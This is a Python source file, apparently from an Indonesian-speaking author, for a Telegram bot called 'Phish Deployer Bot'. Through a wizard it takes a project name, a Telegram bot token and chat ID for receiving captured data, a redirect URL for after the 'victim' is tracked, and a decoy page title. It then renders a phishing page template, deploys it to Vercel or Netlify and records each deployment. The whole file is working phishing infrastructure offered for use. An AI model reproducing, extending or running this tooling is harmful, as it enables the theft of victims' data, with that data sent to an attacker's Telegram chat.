"""Telegram bot — wizard deploy phishing page. Config dari config.py."""
import re
import logging

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ConversationHandler,
    CallbackQueryHandler, ContextTypes, filters,
)

from config import (
    BOT_TOKEN, ADMIN_CHAT_ID, VERCEL_TOKEN, NETLIFY_TOKEN,
    DB_PATH, TEMPLATE_PATH, MAX_DEPLOY_PER_USER_PER_DAY,
)
from renderer import render_template, generate_ray_id
from deployers.vercel import deploy_vercel
from deployers.netlify import deploy_netlify
from db import DB

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("phish-bot")

db = DB(DB_PATH)

# state machine
(
    CHOOSE_PROVIDER, ASK_PROJECT, ASK_TOKEN, ASK_CHAT_ID,
    ASK_REDIRECT, ASK_TITLE, ASK_OPERATOR, CONFIRM,
) = range(8)

NAME_RE = re.compile(r"^[a-z0-9][a-z0-9-]{1,30}[a-z0-9]$")
TG_TOKEN_RE = re.compile(r"^\d{8,12}:[A-Za-z0-9_-]{30,40}$")


def is_admin(uid: int) -> bool:
    return uid == ADMIN_CHAT_ID


# ───────────── Handlers ─────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🛠️ <b>Phish Deployer Bot</b>\n\n"
        "Perintah:\n"
        "/new — bikin deployment baru\n"
        "/list — lihat deployment lu\n"
        "/info &lt;id&gt; — detail deployment\n"
        "/cancel — batalin wizard\n",
        parse_mode="HTML",
    )


async def cmd_new(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("Vercel", callback_data="prov:vercel")],
        [InlineKeyboardButton("Netlify", callback_data="prov:netlify")],
    ]
    await update.message.reply_text(
        "Pilih provider deploy:",
        reply_markup=InlineKeyboardMarkup(kb),
    )
    return CHOOSE_PROVIDER


async def choose_provider(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    provider = q.data.split(":", 1)[1]
    ctx.user_data["provider"] = provider
    await q.edit_message_text(
        f"Provider: <b>{provider}</b>\n\n"
        "Masukin <b>nama project</b> (lowercase, tanda hubung ok, 3-32 char).\n"
        "Contoh: <code>promo-maret-01</code>",
        parse_mode="HTML",
    )
    return ASK_PROJECT


async def ask_project(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    name = update.message.text.strip().lower()
    if not NAME_RE.match(name):
        await update.message.reply_text(
            "❌ Nama project invalid. Pakai lowercase + tanda hubung, 3-32 char. Coba lagi:"
        )
        return ASK_PROJECT
    ctx.user_data["project_name"] = name
    await update.message.reply_text(
        "Masukin <b>Telegram Bot Token</b> tujuan (buat nerima hasil):\n"
        "Format: <code>123456:ABC-DEF...</code>",
        parse_mode="HTML",
    )
    return ASK_TOKEN


async def ask_token(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    tok = update.message.text.strip()
    if not TG_TOKEN_RE.match(tok):
        await update.message.reply_text(
            "❌ Format token salah. Coba lagi (contoh: <code>123456789:AAE...</code>):",
            parse_mode="HTML",
        )
        return ASK_TOKEN
    ctx.user_data["telegram_token"] = tok
    await update.message.reply_text(
        "Masukin <b>Chat ID</b> tujuan (angka, contoh: <code>5908693941</code>):",
        parse_mode="HTML",
    )
    return ASK_CHAT_ID


async def ask_chat_id(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    cid = update.message.text.strip()
    if not re.match(r"^-?\d{5,15}$", cid):
        await update.message.reply_text("❌ Chat ID harus angka. Coba lagi:")
        return ASK_CHAT_ID
    ctx.user_data["telegram_chat_id"] = cid
    await update.message.reply_text(
        "Masukin <b>URL redirect</b> setelah victim selesai di-track:\n"
        "Contoh: <code>https://www.instagram.com</code>",
        parse_mode="HTML",
    )
    return ASK_REDIRECT


async def ask_redirect(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith(("http://", "https://")):
        await update.message.reply_text("❌ URL harus mulai http:// atau https://. Coba lagi:")
        return ASK_REDIRECT
    ctx.user_data["target_redirect"] = url
    await update.message.reply_text(
        "Masukin <b>judul halaman</b> (title tab browser):\n"
        "Contoh: <code>Just a moment...</code>",
        parse_mode="HTML",
    )
    return ASK_TITLE


async def ask_title(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["page_title"] = update.message.text.strip()[:80]
    await update.message.reply_text(
        "Masukin <b>operator tag</b> (footer pesan ke TG target):\n"
        "Contoh: <code>Telegram @username_lu</code>\n"
        "Ketik <code>-</code> buat skip.",
        parse_mode="HTML",
    )
    return ASK_OPERATOR


async def ask_operator(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    tag = update.message.text.strip()
    ctx.user_data["operator_tag"] = "" if tag == "-" else tag
    d = ctx.user_data

    summary = (
        "📋 <b>Konfirmasi deployment</b>\n\n"
        f"Provider: <b>{d['provider']}</b>\n"
        f"Project: <code>{d['project_name']}</code>\n"
        f"TG Token: <code>{d['telegram_token'][:12]}...</code>\n"
        f"TG Chat ID: <code>{d['telegram_chat_id']}</code>\n"
        f"Redirect: <code>{d['target_redirect']}</code>\n"
        f"Title: {d['page_title']}\n"
        f"Operator: {d['operator_tag'] or '-'}\n\n"
        "Gas deploy?"
    )
    kb = [
        [InlineKeyboardButton("✅ Deploy", callback_data="go")],
        [InlineKeyboardButton("❌ Batal", callback_data="cancel")],
    ]
    await update.message.reply_text(summary, parse_mode="HTML",
                                    reply_markup=InlineKeyboardMarkup(kb))
    return CONFIRM


async def confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    if q.data == "cancel":
        await q.edit_message_text("❌ Dibatalkan.")
        ctx.user_data.clear()
        return ConversationHandler.END

    d = ctx.user_data
    user = update.effective_user

    today_count = await db.count_today(user.id)
    if today_count >= MAX_DEPLOY_PER_USER_PER_DAY:
        await q.edit_message_text(
            f"❌ Limit harian tercapai ({MAX_DEPLOY_PER_USER_PER_DAY}/hari). "
            "Coba lagi besok."
        )
        ctx.user_data.clear()
        return ConversationHandler.END

    await q.edit_message_text("⏳ Rendering template...")

    ray_id = generate_ray_id(f"{d['project_name']}{user.id}")
    vars_ = {
        "TELEGRAM_TOKEN": d["telegram_token"],
        "TELEGRAM_CHAT_ID": d["telegram_chat_id"],
        "TARGET_REDIRECT_URL": d["target_redirect"],
        "PAGE_TITLE": d["page_title"],
        "RAY_ID": ray_id,
        "OPERATOR_TAG": d["operator_tag"],
    }

    try:
        html = render_template(TEMPLATE_PATH, vars_)
    except Exception as e:
        await q.edit_message_text(f"❌ Render gagal: {e}")
        ctx.user_data.clear()
        return ConversationHandler.END

    await q.edit_message_text("🚀 Deploying ke provider...")

    try:
        if d["provider"] == "vercel":
            if not VERCEL_TOKEN:
                raise RuntimeError("VERCEL_TOKEN belum di-set di config.py")
            url = await deploy_vercel(VERCEL_TOKEN, d["project_name"], html)
        elif d["provider"] == "netlify":
            if not NETLIFY_TOKEN:
                raise RuntimeError("NETLIFY_TOKEN belum di-set di config.py")
            url = await deploy_netlify(NETLIFY_TOKEN, d["project_name"], html)
        else:
            raise RuntimeError(f"Provider tidak dikenal: {d['provider']}")
    except Exception as e:
        log.exception("Deploy gagal")
        await q.edit_message_text(f"❌ Deploy gagal: <code>{e}</code>", parse_mode="HTML")
        ctx.user_data.clear()
        return ConversationHandler.END

    deploy_id = await db.insert_deploy(
        user_id=user.id,
        username=user.username,
        project_name=d["project_name"],
        url=url,
        provider=d["provider"],
        telegram_token=d["telegram_token"],
        telegram_chat_id=d["telegram_chat_id"],
        target_redirect=d["target_redirect"],
        operator_tag=d["operator_tag"],
    )

    await q.edit_message_text(
        f"✅ <b>Deploy berhasil</b>\n\n"
        f"🔗 URL: {url}\n"
        f"🆔 Deploy ID: <code>{deploy_id}</code>\n"
        f"📦 Project: <code>{d['project_name']}</code>\n\n"
        f"Ketik /list buat liat semua.",
        parse_mode="HTML",
    )
    ctx.user_data.clear()
    return ConversationHandler.END


async def cmd_list(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    rows = await db.list_user_deploys(update.effective_user.id)
    if not rows:
        await update.message.reply_text("Belum ada deployment. /new buat mulai.")
        return
    lines = ["📦 <b>Deployment lu</b>\n"]
    for r in rows:
        lines.append(
            f"<code>#{r['id']}</code> [{r['provider']}] {r['project_name']}\n"
            f"   🔗 {r['url']}\n"
            f"   🕰️ {r['created_at']}"
        )
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")


async def cmd_info(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Pakai: /info &lt;id&gt;", parse_mode="HTML")
        return
    try:
        did = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ ID harus angka.")
        return

    r = await db.get_deploy(did)
    if not r or (r["user_id"] != update.effective_user.id and not is_admin(update.effective_user.id)):
        await update.message.reply_text("❌ Nggak ketemu atau bukan punya lu.")
        return

    await update.message.reply_text(
        f"🆔 <code>{r['id']}</code>\n"
        f"Provider: {r['provider']}\n"
        f"Project: <code>{r['project_name']}</code>\n"
        f"URL: {r['url']}\n"
        f"Redirect: <code>{r['target_redirect']}</code>\n"
        f"Operator: {r['operator_tag'] or '-'}\n"
        f"Dibuat: {r['created_at']}",
        parse_mode="HTML",
    )


async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data.clear()
    await update.message.reply_text("❌ Dibatalkan.")
    return ConversationHandler.END


# ───────────── Bootstrap ─────────────

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("new", cmd_new)],
        states={
            CHOOSE_PROVIDER: [CallbackQueryHandler(choose_provider, pattern=r"^prov:")],
            ASK_PROJECT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_project)],
            ASK_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_token)],
            ASK_CHAT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_chat_id)],
            ASK_REDIRECT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_redirect)],
            ASK_TITLE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_title)],
            ASK_OPERATOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_operator)],
            CONFIRM: [CallbackQueryHandler(confirm, pattern=r"^(go|cancel)$")],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        allow_reentry=True,
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("list", cmd_list))
    app.add_handler(CommandHandler("info", cmd_info))
    app.add_handler(conv)

    async def _post_init(app_: Application):
        await db.init()
        log.info("DB ready. Bot start. Token config: %s...", BOT_TOKEN[:12])

    app.post_init = _post_init
    log.info("Polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
